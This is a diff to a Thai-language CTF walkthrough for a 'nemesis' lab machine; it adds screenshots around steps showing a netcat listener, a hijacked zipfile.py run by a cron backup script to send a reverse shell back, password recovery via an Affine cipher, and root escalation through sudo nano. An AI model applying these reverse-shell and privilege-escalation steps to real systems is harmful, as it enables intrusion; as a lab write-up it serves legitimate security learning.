@@ -230,6 +230,9 @@ pty.spawn("/bin/bash")
 
 save แล้วออกจาก nano
 
+<img width="825" height="380" alt="image" src="https://github.com/user-attachments/assets/e6dc827a-4508-4cc6-9fe7-449fa4cea991" />
+
+
 #### 4.4.2 ตรวจว่ามี zipfile.py อยู่ที่ไหนบ้าง (ออปชัน)
 
 ```bash
@@ -261,12 +264,16 @@ nc -nvlp 4444
 
 เมื่อ cron/backup script ทำงาน (เรียก `backup.py` ที่ import zipfile) → โค้ดใน `zipfile.py` ของเราจะถูกรัน และ shell จะวิ่งกลับมาที่ Kali
 
+<img width="825" height="414" alt="image" src="https://github.com/user-attachments/assets/0f7501c9-12f6-4b4d-a283-f7b87fa651d6" />
+
 เช่น ผลลัพธ์ที่เห็นบน Kali:
 
 ```text
 connect to [88.88.88.3] from (UNKNOWN) [88.88.88.5] 40770
 carlos@nemesis:~$
 ```
+
+<img width="825" height="415" alt="image" src="https://github.com/user-attachments/assets/9577c58c-7836-4fc7-8b89-9da382b786dc" />
 
 ตอนนี้เราได้ shell เป็น `carlos`
 
@@ -279,10 +286,13 @@ ls -la
 cat flag2.txt
 cat encrypt.py
 ```
+<img width="825" height="479" alt="image" src="https://github.com/user-attachments/assets/dcfa439b-fc63-4010-bfa2-c681bb28c3c4" />
 
 - `ls -la` → เห็นไฟล์ เช่น `flag2.txt`, `encrypt.py`, อื่น ๆ
 - `cat flag2.txt` → อ่าน Flag2
 - `cat encrypt.py` → ดูโค้ดที่ใช้ **Affine cipher** และ ciphertext (เช่น `FAJ5RWQXLAXDQZAWNDVLSU`)
+
+<img width="825" height="506" alt="image" src="https://github.com/user-attachments/assets/54e4e3a5-47a0-408c-ab4c-f4a317b8b992" />
 
 นำ ciphertext ไปถอดบนเว็บ:
 
@@ -293,6 +303,7 @@ cat encrypt.py
 ```text
 ENCRYPTIONISFUNPASSWORD
 ```
+<img width="825" height="584" alt="image" src="https://github.com/user-attachments/assets/d4fbf9f1-f747-441e-af96-2e517b5dd9dd" />
 
 ข้อความนี้คือ **password ของ user `carlos`** ที่ใช้กับ `su carlos`
 
@@ -342,6 +353,8 @@ User carlos may run the following commands on nemesis:
 ```
 
 แปลว่า `carlos` สามารถรัน `nano /opt/priv` ในสิทธิ์ root ได้
+
+<img width="825" height="506" alt="image" src="https://github.com/user-attachments/assets/effaba81-c67f-40ac-9080-d773d9029e23" />
 
 #### 4.5.3 เปิด nano ในสิทธิ์ root
 
@@ -395,6 +408,8 @@ cat root.txt
 - `cat root.txt` → อ่าน root flag และข้อความสรุปจากผู้สร้าง CTF
 
 ---
+
+<img width="825" height="518" alt="image" src="https://github.com/user-attachments/assets/a4b5f462-26b8-4bd3-a4a8-eabfb84e3591" />
 
 ## 5. ตารางสรุปคำสั่งสำคัญ
 
